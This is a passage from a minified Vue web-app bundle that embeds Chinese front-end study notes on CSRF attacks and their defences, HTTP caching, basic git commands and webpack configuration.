浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 \r\n\t- CSRF攻击的本质原因 ：CSRF 攻击时源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自某个用户的浏览器，但无法保证该请求是经过用户批准发送的。\r\n\r\n- （3）CSRF的攻击手段\r\n\r\n\t-  1.譬如在网站内的图片资源中潜入恶意的转账操作\r\n\r\n\t-  2.构建恶意的隐藏表单，并通过脚本提交恶意请求\r\n\r\n\t- 【注意】\r\n\r\n\t\t- 从头到尾，攻击网站都没有获取到过 cookie，都是通过浏览器间接实现（利用Web的cookie隐式身份验证机制），所以HttpOnly并不会影响这个攻击\r\n\r\n\t- 【例子】（必看）\r\n\r\n\t\t- （1）假设有一个 bbs 站点：http://www.c.com，当登录后的用户发起如下 GET 请求时，会删除 ID 指定的帖子\r\n\r\n\t\t\t- 如发起 http://www.c.com:8002/content/delete/87343 请求时，会删除 id 为 87343 的帖子。当用户登录之后，会设置如下 cookie\r\n\r\n\t\t- （2）然后构造一个页面 A\r\n\r\n\t\t- （3）页面 A 使用了一个 img 标签，其地址指向了删除用户帖子的链接\r\n\r\n\t\t- （4）可以看到，当登录用户访问攻击者的网站时，会向 www.c.com 发起一个删除用户帖子的请求。此时若用户在切换到 www.c.com 的帖子页面刷新，会发现ID 为 87343 的帖子已经被删除。\r\n\t\t- 深刻理解\r\n\r\n\t\t\t- 由于 Cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起 CSRF 攻击。在这个攻击过程中，攻击者借助受害者的 Cookie 骗取服务器的信任，但并不能拿到 Cookie，也看不到 Cookie 的内容。而对于服务器返回的结果，由于浏览器同源策略的限制，攻击者也无法进行解析。因此，攻击者无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。\r\n\r\n- （4）常见的CSRF防御手段\r\n\r\n\t- 1.利用Token来防御\r\n\r\n\t  CSRF 攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 Cookie 中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的 Cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求\r\n\r\n\t\t- 当客户端请求页面时，服务器会生成一个随机数Token，并且将Token放置到session当中，然后将Token发给客户端（一般通过构造hidden表单）。下次客户端提交请求时，Token会随着表单一起提交到服务器端。 \r\n\t\t- 然后，如果应用于"anti csrf攻击"，则服务器端会对Token值进行验证，判断是否和session中的Token值相等，若相等，则可以证明请求有效，不是伪造的。 \r\n\r\n\t- 2.检测referer\r\n\r\n\t\t- referer是什么？\r\n\r\n\t\t\t- 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的"源"。\r\n\r\n\t\t- 场景\r\n\r\n\t\t\t- 比如，如果用户要删除自己的帖子，那么先要登录 www.c.com，然后找到对应的页面，发起删除帖子的请求。此时，Referer 的值是 http://www.c.com；当请求是从 www.a.com 发起时，Referer 的值是 http://www.a.com 了。因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 www.c.com 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。\r\n\r\n\t\t- 代码\r\n\r\n\t\t\t- 针对上文的例子，可以在服务端增加如下代码：\r\n\r\n\t\t- 存在问题\r\n\r\n\t\t\t- 后台在进行删除操作之前先判断referer，如果不是本域的请求，则直接拒绝，这种做法很有效。但是，想想这样一个场景：如果博客允许评论里面插图，攻击者完全可以将 img插入到原网站中，这样refer还是在当下域名，博客依然会被删除。所有可能引入链接的html标签都是不可信的，如script、link，后台过滤策略一定要考虑到。\r\n\r\n\t- CSRF 防御主要是过滤那些非法伪造的请求来源。\r\n\r\n- （5）CSRF与AJAX的关系\r\n\r\n\t- 分析AJAX中带cookie验证的情况：\r\n\r\n\t\t- 1. AJAX受到浏览器的同源策略限制\r\n\t\t- 2. AJAX默认无法请求跨域的接口（当然后台可以配置`Access-Control-Allow-Origin: *`之类的允许所有的跨域请求）\r\n\t\t- 3. AJAX请求无法携带跨域cookie（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）\r\n\r\n\t- CSRF与AJAX无关\r\n\r\n',Ls={data:function(){return{MainComponent:Rs}}},Os=Ls,As=Object(u["a"])(Os,js,Ms,!1,null,"45da2251",null),Is=As.exports,Ds=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ps=[],Ns="# 缓存\r\n## 缓存详解\r\n### （1）缓存的好处\r\n- 缓解服务器压力(不用每次去请求资源)；\r\n- 提升性能(打开本地资源速度当然比请求回来再打开要快得多)；\r\n- 减少带宽消耗；\r\n### （2）缓存的种类\r\n- 宏观分类\r\n\t- 私有缓存\r\n\t\t- 私有缓存就是用户专享的，各级代理不能缓存的缓存\r\n\t- 共享缓存\r\n\t\t- 共享缓存就是那些能被各级代理缓存的缓存\r\n- 微观分类\r\n\t- 1. 浏览器缓存\r\n\t\t- 浏览器缓存存在的意义就是当用户点击back按钮或是再次去访问某个页面的时候能够更快的响应。尤其是在多页应用的网站中，如果你在多个页面使用了一张相同的图片，那么缓存这张图片就变得特别的有用。\r\n\t- 2. 代理服务器缓存\r\n\t\t- 代理服务器缓存原理和浏览器端类似，但规模要大得多，因为是为成千上万的用户提供缓存机制，大公司和大型的ISP提供商通常会将它们设立在防火墙上或是作为一个独立的设备来运营。\r\n\t- 3. 网关缓存\r\n\t  CDNS(网络内容分发商)分布网关缓存到整个（或部分）互联网上，并出售缓存服务给需要的网站，比如国内的七牛云、又拍云都有这种服务。\r\n\t\t- 也被称为代理缓存或反向代理缓存，网关也是一个中间服务器，网关缓存一般是网站管理员自己部署，从让网站拥有更好的性能\r\n### （3）浏览器的缓存策略\r\n- 缓存的目标：\r\n\t- （1）一个检索请求的成功响应: \r\n\t\t- 对于 GET请求，响应状态码为：200，则表示为成功。一个包含例如HTML文档，图片，或者文件的响应；\r\n\t- （2）不变的重定向: \r\n\t\t- 响应状态码：301；\r\n\t- （3）可用缓存响应：响应状态码：\r\n\t\t- 304，这个存在疑问，Chrome会缓存304中的缓存设置，Firefox；\r\n\t- （4）错误响应: \r\n\t\t- 响应状态码：404 的一个页面；\r\n\t- （5）不完全的响应: \r\n\t\t- 响应状态码 206，只返回局部的信息；\r\n\t- （6）除了 GET 请求外，如果匹配到作为一个已被定义的cache键名的响应；\r\n- 浏览器怎么确定一个资源该不该缓存？\r\n\t- 浏览器对于缓存的处理是根据第一次请求资源时返回的响应头来确定的。\r\n\t- 响应头！响应头！响应头！\r\n- 1.强缓存阶段\r\n\t- 浏览器第一次请求时\r\n\t\t- 这就是强缓存阶段，当浏览器再次试图访问这个CSS文件，发现有这个文件的缓存，那么就判断根据上一次的响应判断是否过期，如果没过期，使用缓存。加载文件，OVER！\r\n\t\t- 浏览器表现\r\n\t\t\t- Firefox浏览器表现为一个灰色的200状态码。Chrome浏览器状态码表现为:200 (from disk cache)或是200 OK (from memory cache)\r\n\t- 浏览器在请求某一资源时，会先获取该资源缓存的header信息，判断是否命中强缓存（cache-control和expires信息），若命中直接从缓存中获取资源信息，包括缓存header信息；本次请求根本就不会与服务器进行通信；\r\n\t- 强缓存如何重新加载缓存缓存过的资源\r\n\t  使用强缓存时，浏览器不会发送请求到服务端，根据设置的缓存时间浏览器一直从缓存中获取资源，在这期间若资源产生了变化，浏览器就在缓存期内就一直得不到最新的资源，那么如何防止这种事情发生呢？\r\n\t\t- 通过更新页面中引用的资源路径，让浏览器主动放弃缓存，加载新资源。\r\n- 2.协商缓存阶段\r\n\t- 浏览器后续在进行请求时\r\n\t\t- 当响应过期了，ETag和Last-Modified就该闪亮登场了。Last-Modified，这个字段是文件最后一次修改的时间；ETag呢？ETag是对文件的一个标记\r\n\t- 利用这两个字段浏览器可以进入协商缓存阶段，当浏览器再次试图访问这个CSS文件，发现缓存过期，于是会在本次请求的请求头里携带If-Moified-Since和If-None-Match这两个字段（前者的值为上次响应的Last-Modified的时间，后者的值为上一次返回的ETag的值），服务器通过这两个字段来判断资源是否有修改，如果有修改则返回状态码200和新的内容，如果没有修改返回状态码304，浏览器收到200状态码，该咋处理就咋处理(相当于首次访问这个文件了)，发现返回304，于是知道了本地缓存虽然过期但仍然可以用，于是加载本地缓存。然后根据新的返回的响应头来设置缓存。\r\n\t- 注意：304和缓存的区别\r\n\t\t- 缓存不会发起请求了，直接从内存或者硬盘中获得\r\n\t\t- 304依然会发起请求与响应，只不过响应的第四部分不用再次下载了，因为没有更改，所以还是第一次下载的资源。\r\n## HTTP缓存\r\n### 前端缓存主要是分为HTTP缓存和浏览器缓存。其中HTTP缓存是在HTTP请求传输时用到的缓存，主要在服务器代码上设置；而浏览器缓存则主要由前端开发在前端js上进行设置。\r\n### 三 强制缓存\r\n- 强制缓存就是向浏览器缓存查找该请求结果，并根据该结果的缓存规则来决定是否使用该缓存结果的过程，强制缓存的情况主要有三种，如下：\r\n  > **①不存在该缓存结果和缓存标识，强制缓存失效，则直接向服务器发起请求（跟第一次发起请求一致），如下图：**\r\n  > **②存在该缓存结果和缓存标识，但该结果已失效，强制缓存失效，则使用协商缓存，如下图**\r\n  > **③存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果，如下图**\r\n  > **那么强制缓存的缓存规则是什么？**\r\n- 当浏览器向服务器发起请求时，服务器会将缓存规则放入HTTP响应报文的HTTP头中和请求结果一起返回给浏览器，控制强制缓存的字段分别是Expires和Cache-Control，其中Cache-Control优先级比Expires高。\r\n- Expires是HTTP/1.0控制网页缓存的字段，其值为服务器返回该请求结果缓存的到期时间，即再次发起该请求时，如果客户端的时间小于Expires的值时，直接使用缓存结果。\r\n- 到了HTTP/1.1，Expire已经被Cache-Control替代，原因在于Expires控制缓存的原理是使用客户端的时间与服务端返回的时间做对比，那么如果客户端与服务端的时间因为某些原因（例如时区不同；客户端和服务端有一方的时间不准确）发生误差，那么强制缓存则会直接失效，这样的话强制缓存的存在则毫无意义。\r\n- ①HTTP响应报文中expires的时间值，是一个绝对值\r\n- ②HTTP响应报文中Cache-Control为max-age=600，是相对值\r\n- 由于Cache-Control的优先级比expires高，那么直接根据Cache-Control的值进行缓存，意思就是说在600秒内再次发起该请求，则会直接使用缓存结果，强制缓存生效。\r\n- 在无法确定客户端的时间是否与服务端的时间同步的情况下，Cache-Control相比于expires是更好的选择，所以同时存在时，只有Cache-Control生效。\r\n- from memory cache代表使用内存中的缓存，from disk cache则代表使用的是硬盘中的缓存，浏览器读取缓存的顺序为memory –> disk –> 服务器请求。\r\n- 那么接下来我们一起详细分析一下缓存读取问题，这里仍让以我的博客为例进行分析：\r\n- 在浏览器中，浏览器会在js和图片等文件解析执行后直接存入内存缓存中，那么当刷新页面时只需直接从内存缓存中读取(from memory cache)；而css文件则会存入硬盘文件中，所以每次渲染页面都需要从硬盘读取缓存(from disk cache)。\r\n### 缓存可以说是性能优化中简单高效的一种优化方式了。一个优秀的缓存策略可以缩短网页请求资源的距离，减少延迟，并且由于缓存文件可以重复利用，还可以减少带宽，降低网络负荷。\r\n### 四 协商缓存\r\n- ①协商缓存生效，返回304，\r\n- ②协商缓存失效，返回200和请求结果结果，\r\n- 同样，协商缓存的标识也是在响应报文的HTTP头中和请求结果一起返回给浏览器的，控制协商缓存的字段分别有：Last-Modified / If-Modified-Since和Etag / If-None-Match，其中Etag / If-None-Match的优先级比Last-Modified / If-Modified-Since高。\r\n- Last-Modified是服务器响应请求时，返回该资源文件在服务器最后被修改的时间，如下。\r\n- If-Modified-Since则是客户端再次发起该请求时，携带上次请求返回的Last-Modified值，通过此字段值告诉服务器该资源上次请求返回的最后被修改时间。服务器收到该请求，发现请求头含有If-Modified-Since字段，则会根据If-Modified-Since的字段值与该资源在服务器的最后被修改时间做对比，若服务器的资源最后被修改时间大于If-Modified-Since的字段值，则重新返回资源，状态码为200；否则则返回304，代表资源无更新，可继续使用缓存文件，如下。\r\n- Etag是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成)，如下。\r\n- If-None-Match是客户端再次发起该请求时，携带上次请求返回的唯一标识Etag值，通过此字段值告诉服务器该资源上次请求返回的唯一标识值。服务器收到该请求后，发现该请求头中含有If-None-Match，则会根据If-None-Match的字段值与该资源在服务器的Etag值做对比，一致则返回304，代表资源无更新，继续使用缓存文件；不一致则重新返回资源文件，状态码为200，如下。\r\n- 注：Etag / If-None-Match优先级高于Last-Modified / If-Modified-Since，同时存在则只有Etag / If-None-Match生效。对于协商缓存，使用 Ctrl+F5强制刷新可以使得缓存无效。但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改了路径相当于是另一个资源了，这也是前端工程化中常用到的技巧）。\r\n- 强制缓存优先于协商缓存进行，若强制缓存(Expires和Cache-Control)生效则直接使用缓存，若不生效则进行协商缓存(Last-Modified / If-Modified-Since和Etag / If-None-Match)，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，重新获取请求结果，再存入浏览器缓存中；生效则返回304，继续使用缓存，主要过程如下：\r\n### 二、缓存过程分析\r\n- 浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识\r\n- 浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中\r\n### 对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。比如说直接使用缓存而不发起请求，或者发起了请求但后端存储的数据和前端一致，那么就没有必要再将数据回传回来，这样就减少了响应数据。\r\n缓存类型图解\r\n## https://www.jianshu.com/p/256d0873c398\r\n## 浏览器缓存 \r\n### 就是本地存储\r\n",qs={data:function(){return{MainComponent:Ns}}},Hs=qs,Bs=Object(u["a"])(Hs,Ds,Ps,!1,null,"6c38415e",null),Fs=Bs.exports,Us=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[n._v("\n   \n===\n  ")])},Js=[],zs={components:{},data:function(){return{}}},Ws=zs,$s=Object(u["a"])(Ws,Us,Js,!1,null,"99be2f7a",null),Gs=$s.exports,Vs={mixins:[xn["a"]],components:{m1:Zi,m2:ss,m3:ds,m4:fs,m5:Cs,m6:Is,m7:Fs,m8:Gs},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"前端性能监测方案",value:"m1"},{label:"算法",value:"m2"},{label:"调试",value:"m3"},{label:"性能",value:"m4"},{label:"现代前端技术解析",value:"m5"},{label:"安全",value:"m6"},{label:"缓存",value:"m7"}]}}},Qs=Vs,Ks=Object(u["a"])(Qs,$i,Gi,!1,null,"2ee12951",null),Xs=Ks.exports,Ys=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},Zs=[],no=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},ro=[],to=(t("caad"),t("ac1f"),t("2532"),t("1276"),' \r\n\r\n\r\n\r\n|                                                              |      |\r\n| ------------------------------------------------------------ | ---- |\r\n| [GitHub for Developers](https://githubtraining.github.io/training-manual/) |      |\r\n| [所有命令](https://git-scm.com/docs/git#_git_commands)       |      |\r\n|                                                              |      |\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n## 安装\r\n\r\n### GitHub Desktop\r\n\r\n[desktop.github.com](https://desktop.github.com/)\r\n\r\n### Git 全平台版\r\n\r\n[git-scm.com](https://git-scm.com/)\r\n\r\n## 配置工具\r\n\r\n对所有本地仓库的用户信息进行配置\r\n\r\n```\r\n$ git config --global user.name "[name]"\r\n```\r\n\r\n对你的commit操作设置关联的用户名\r\n\r\n```\r\n$ git config --global user.email "[email address]"\r\n```\r\n\r\n对你的commit操作设置关联的邮箱地址\r\n\r\n```\r\n$ git config --global color.ui auto\r\n```\r\n\r\n启用有帮助的彩色命令行输出\r\n\r\n## 分支\r\n\r\n分支是使用 Git 工作的一个重要部分。你做的任何提交都会发生在当前“checked out”到的分支上。使用 `git status` 查看那是哪个分支。\r\n\r\n```\r\n$ git branch [branch-name]\r\n```\r\n\r\n创建一个新分支\r\n\r\n```\r\n$ git checkout [branch-name]\r\n```\r\n\r\n切换到指定分支并更新工作目录(working directory)\r\n\r\n```\r\n$ git merge [branch]\r\n```\r\n\r\n将指定分支的历史合并到当前分支。这通常在拉取请求(PR)中完成，但也是一个重要的 Git 操作。\r\n\r\n```\r\n$ git branch -d [branch-name]\r\n```\r\n\r\n删除指定分支\r\n\r\n## 创建仓库\r\n\r\n当着手于一个新的仓库时，你只需创建一次。要么在本地创建，然后推送到 GitHub；要么通过 clone 一个现有仓库。\r\n\r\n```\r\n$ git init\r\n```\r\n\r\n在使用过 `git init` 命令后，使用以下命令将本地仓库与一个 GitHub 上的空仓库连接起来：\r\n\r\n```\r\n$ git remote add origin [url]\r\n```\r\n\r\n将现有目录转换为一个 Git 仓库\r\n\r\n```\r\n$ git clone [url]\r\n```\r\n\r\nClone（下载）一个已存在于 GitHub 上的仓库，包括所有的文件、分支和提交(commits)\r\n\r\n## .gitignore 文件\r\n\r\n有时一些文件最好不要用 Git 跟踪。这通常在名为 `.gitignore` 的特殊文件中完成。你可以在 [github.com/github/gitignore](https://github.com/github/gitignore) 找到有用的 `.gitignore` 文件模板。\r\n\r\n## 同步更改\r\n\r\n将你本地仓库与 GitHub.com 上的远端仓库同步\r\n\r\n```\r\n$ git fetch\r\n```\r\n\r\n下载远端跟踪分支的所有历史\r\n\r\n```\r\n$ git merge\r\n```\r\n\r\n将远端跟踪分支合并到当前本地分支\r\n\r\n```\r\n$ git push\r\n```\r\n\r\n将所有本地分支提交上传到 GitHub\r\n\r\n```\r\n$ git pull\r\n```\r\n\r\n使用来自 GitHub 的对应远端分支的所有新提交更新你当前的本地工作分支。`git pull` 是 `git fetch` 和 `git merge` 的结合\r\n\r\n## 进行更改\r\n\r\n浏览并检查项目文件的发展\r\n\r\n```\r\n$ git log\r\n```\r\n\r\n列出当前分支的版本历史\r\n\r\n```\r\n$ git log --follow [file]\r\n```\r\n\r\n列出文件的版本历史，包括重命名\r\n\r\n```\r\n$ git diff [first-branch]...[second-branch]\r\n```\r\n\r\n展示两个分支之间的内容差异\r\n\r\n```\r\n$ git show [commit]\r\n```\r\n\r\n输出指定commit的元数据和内容变化\r\n\r\n```\r\n$ git add [file]\r\n```\r\n\r\n将文件进行快照处理用于版本控制\r\n\r\n```\r\n$ git commit -m "[descriptive message]"\r\n```\r\n\r\n将文件快照永久地记录在版本历史中\r\n\r\n## 重做提交\r\n\r\n清除错误和构建用于替换的历史\r\n\r\n```\r\n$ git reset [commit]\r\n```\r\n\r\n撤销所有 `[commit]` 后的的提交，在本地保存更改\r\n\r\n```\r\n$ git reset --hard [commit]\r\n```\r\n\r\n放弃所有历史，改回指定提交。'),eo={data:function(){return{MainComponent:to,img_prefix:"./img/linux/heima-Linux云计算/讲义/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},ao=eo,io=Object(u["a"])(ao,no,ro,!1,null,"0a636dcc",null),so=io.exports,oo=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},lo=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h1",[n._v("webpack")]),t("h2",[n._v("Webpack4.0")]),t("h3",[n._v("Webpack初探")]),t("ul",[t("li",[t("p",[n._v("webpack安装方式")]),t("ul",[t("li",[n._v("全局安装：npm install webpack -g")]),t("li",[n._v("局部安装：npm instatll webpack -D")]),t("li",[n._v("安装指定版本：npm intatll webpack@版本号")])])]),t("li",[t("p",[n._v("webpack配置")]),t("ul",[t("li",[t("p",[n._v("默认配置文件webpack.config.js")]),t("ul",[t("li",[n._v("node核心模块path")]),t("li",[n._v("局部安装运行打包，npx webpack")]),t("li",[n._v("// 文件内容\nconst path = require('path');\nmodule.exports = {\nentry: './index.js',\noutput: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'bundle')\n}\n}")])])]),t("li",[t("p",[n._v("以webpackconfig.js为配置文件进行打包： npx webpack --config webpackconfig.js")])]),t("li",[t("p",[n._v("运行webpack")]),t("ul",[t("li",[n._v("全局安装时，webpack index.js")]),t("li",[n._v("局部安装时，npx webpack index.js")]),t("li",[n._v("在package.json的scripts中简化打包命令后，npm run bundle -> webpack")])])]),t("li",[t("p",[n._v("webpack-cli作用：在命令行中使用webpack")])])])]),t("li",[t("p",[n._v("浅析webpack打包输出内容")]),t("ul",[t("li",[t("p",[n._v("在配置文件中，增加mode配置")]),t("ul",[t("li",[n._v("mode为production时，打包文件压缩")]),t("li",[n._v("mode为development时，打包文件不压缩")]),t("li",[n._v("mode默认为production，配置文件中没有mode配置，打包代码时会出现警告")])])])])])]),t("h3",[n._v("Webpack的核心概念")]),t("ul",[t("li",[t("p",[n._v("loader预处理文件，可以打包除js之外的任何静态资源")]),t("ul",[t("li",[t("p",[n._v("打包图片资源")]),t("ul",[t("li",[t("p",[n._v("file-loader")]),t("ul",[t("li",[t("p",[n._v("配置项：options")]),t("ul",[t("li",[n._v("name")]),t("li",[n._v("outputPath")])])]),t("li",[t("p",[n._v("占位符：placeholders")]),t("ul",[t("li",[n._v("文件名称：[name]")]),t("li",[n._v("文件后缀：[ext]")]),t("li",[n._v("hash值：[hash]")])])])])]),t("li",[t("p",[n._v("url-loader")]),t("ul",[t("li",[n._v("与file-loader功能类似")]),t("li",[n._v("比file-loader多一个limit配置项，大于limit值，与file-loader功能一样单独打包；小于limit值，以base64形式打包进js文件")])])])])]),t("li",[t("p",[n._v("打包样式资源")]),t("ul",[t("li",[t("p",[n._v("style-loader")]),t("ul",[t("li",[n._v("将JS字符串生成为style节点")])])]),t("li",[t("p",[n._v("css-loader")]),t("ul",[t("li",[t("p",[n._v("作用：将CSS转化成CommonJS模块")])]),t("li",[t("p",[n._v("options")]),t("ul",[t("li",[n._v("局部作用域css：modules")]),t("li",[n._v("在css-loader前应用的loader的数量：importLoaders")])])])])]),t("li",[t("p",[n._v("postcss-loader")])]),t("li",[t("p",[n._v("sass-loader")]),t("ul",[t("li",[n._v("将Sass编译成CSS")])])]),t("li",[t("p",[n._v("less-loader")]),t("ul",[t("li",[n._v("将Less编译成CSS")])])])])]),t("li",[t("p",[n._v("打包字体资源")]),t("ul",[t("li",[n._v("file-loader")])])])])]),t("li",[t("p",[n._v("plugins可以在webpack运行到某个时刻的时候，帮你做一些事情")]),t("ul",[t("li",[n._v("htmlWebpackPlugin会在打包结束后，自动生成一个html文件，并把打包生成的js自动引入到这个html文件中")]),t("li",[n._v("cleanWebpackPlugin在打包之前删除打包输出文件夹（dist）")]),t("li",[n._v("学习plugin：谷歌或百度所需功能需要使用plugin，查找相关api学习使用")])])]),t("li",[t("p",[n._v("entry与output")]),t("ul",[t("li",[t("p",[n._v("entry")]),t("ul",[t("li",[n._v("{\nmain: './src/index.js',\nsub: './src/index.js'\n}")])])]),t("li",[t("p",[n._v("output")]),t("ul",[t("li",[n._v("filename：'[name].js'，占位符[name]表示输出文件名称与entry的key值一致")]),t("li",[n._v("publicPath：指定在浏览器中引用时输出目录的公共url，如"),t("a",{staticClass:"url",attrs:{href:"http://www.cdn.com/main.js",target:"_blank"}},[n._v("http://www.cdn.com/main.js")]),n._v("，"),t("a",{staticClass:"url",attrs:{href:"http://www.cdn.com/sub.js",target:"_blank"}},[n._v("http://www.cdn.com/sub.js")])])])])])]),t("li",[t("p",[n._v("sourceMap映射打包文件与原始文件关系")]),t("ul",[t("li",[n._v("devtool: 'none'，有错误信息时显示在dist文件夹下文件中的报错位置")]),t("li",[n._v("devtool: 'source-map'，生成映射关系文件，有错误信息时显示在源文件中的报错位置")]),t("li",[n._v("devtool: 'inline-source-map'，在打包文件最后生成映射关系字符串")]),t("li",[n._v("devtool: 'cheap-module-eval-source-map'（devlopment环境使用）")]),t("li",[n._v("devtool: 'cheap-module-source-map'（production环境使用）")])])]),t("li",[t("p",[n._v("WebpackDevServer提升开发效率")]),t("ul",[t("li",[t("p",[n._v("webpack --watch   监控到webpack打包代码变化，自动执行打包过程，不会起一个服务器，不能进行ajax调试，不能自动打开浏览器")])]),t("li",[t("p",[n._v("安装webpack-dev-server模块")])]),t("li",[t("p",[n._v("webpack-dev-server --open     启动服务器，监听代码变化，自动刷新浏览器")])]),t("li",[t("p",[n._v("不用WebpackDevServer，使用webpack-dev-middleware配合express自己写WebpackDevServer")])]),t("li",[t("p",[n._v("使用webpack的两种方式")]),t("ul",[t("li",[n._v("在node中使用webpack")]),t("li",[n._v("在命令行中使用webpack")])])])])]),t("li",[t("p",[n._v("Hot Module Replacement")]),t("ul",[t("li",[n._v("在devServer中设置hot，hotOnly")]),t("li",[n._v("在plugins中引入HotModuleReplacementPlugin")]),t("li",[n._v("要通过import引入文件，通过require引入文件HMR失效")]),t("li",[n._v("module.hot.accept")])])]),t("li",[t("p",[n._v("使用Babel处理ES6语法")]),t("ul",[t("li",[t("p",[n._v("babel官网："),t("a",{staticClass:"url",attrs:{href:"https://babeljs.io",target:"_blank"}},[n._v("https://babeljs.io")])])]),t("li",[t("p",[n._v("Setup中查找webpack，参照文档在webpack中使用babel")])]),t("li",[t("p",[n._v("将ES6转成ES5")]),t("ul",[t("li",[t("p",[n._v("业务代码引入polyfill")]),t("ul",[t("li",[n._v("在Docs中找到polyfill，参照文档引入polyfill")]),t("li",[n._v("在presets中使用配置useBuiltIns: 'usage'，根据需要引入polyfill内容")])])]),t("li",[t("p",[n._v("在库项目代码/类库中使用transform-runtime，避免polyfill问题，polyfill污染全局环境，plugin-transform-runtime以闭包形式注入/间接帮助组件引入对应内容，不存在全局污染概念")])])])])])])]),t("h3",[n._v("Webpack的高级概念")]),t("ul",[t("li",[t("p",[n._v("Tree Shaking")]),t("ul",[t("li",[t("p",[n._v("引入模块时，不引入所有代码，只引入需要代码")])]),t("li",[t("p",[n._v("只支持ES Module引入")])]),t("li",[t("p",[n._v("模式")]),t("ul",[t("li",[t("p",[n._v("development")]),t("ul",[t("li",[n._v("// webpack.config.js中配置\noptimization: {\nusedExports: true\n}")]),t("li",[n._v('// pacakge.js中配置\n"sideEffects": false')])])]),t("li",[t("p",[n._v("production")]),t("ul",[t("li",[n._v("// webpack.config.js中修改配置\ndevtool: 'cheap-module-source-map'")]),t("li",[n._v('// pacakge.js中配置\n"sideEffects": false')])])])])])])]),t("li",[t("p",[n._v("Development和Production模式的区分打包")]),t("ul",[t("li",[n._v("根据开发环境与生产环境创建不同配置文件，提取公共文件")]),t("li",[n._v("webpack-merge模块合并公共配置文件与不同模式文件")])])]),t("li",[t("p",[n._v("Webpack 和Code Splitting")]),t("ul",[t("li",[t("p",[n._v("同步代码分割：optimization配置")])]),t("li",[t("p",[n._v("异步代码分割")]),t("ul",[t("li",[n._v("安装模块：babel-plugin-dynamic-import-webpack")]),t("li",[n._v('.babelrc中配置：plugins: ["dynamic-import-webpack"]')])])])])]),t("li",[t("p",[n._v("SplitChunksPlugin配置参数详解")])]),t("li",[t("p",[n._v("Lazy Loading懒加载")])])]),t("h2",[n._v("Webpack 4.0基本配置")]),t("h3",[n._v("entry")]),t("ul",[t("li",[t("p",[n._v("作用：指示webpack应该使用哪个模块，来作为构建其内部依赖图的开始")])]),t("li",[t("p",[n._v("配置")]),t("ul",[t("li",[t("p",[n._v("单入口")])]),t("li",[t("p",[n._v("多入口")]),t("ul",[t("li",[n._v("entry")]),t("li",[n._v("new HtmlWebpackPlugin()")])])])])])]),t("h3",[n._v("output")]),t("ul",[t("li",[t("p",[n._v("作用：output 属性告诉 webpack 在哪里输出它所创建的 bundles，以及如何命名这些文件")])]),t("li",[t("p",[n._v("配置")]),t("ul",[t("li",[t("p",[n._v("path : 想要bundle生成到哪里")]),t("ul",[t("li",[n._v("原理：path模块是一个Node.js核心模块，用于操作文件路径")])])]),t("li",[t("p",[n._v("filename:告诉webpack bundle的名称")])])])]),t("li",[t("p",[n._v("常见使用场景")]),t("ul",[t("li",[t("p",[n._v("自动生成引用所有打包完的output JS的HTML入口文件")]),t("ul",[t("li",[n._v("html-webpack-plugin")])])]),t("li",[t("p",[n._v("清除打包文件")]),t("ul",[t("li",[n._v("clean-webpack-plugin")])])])])])]),t("h3",[n._v("loader")]),t("ul",[t("li",[t("p",[n._v("作用：让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 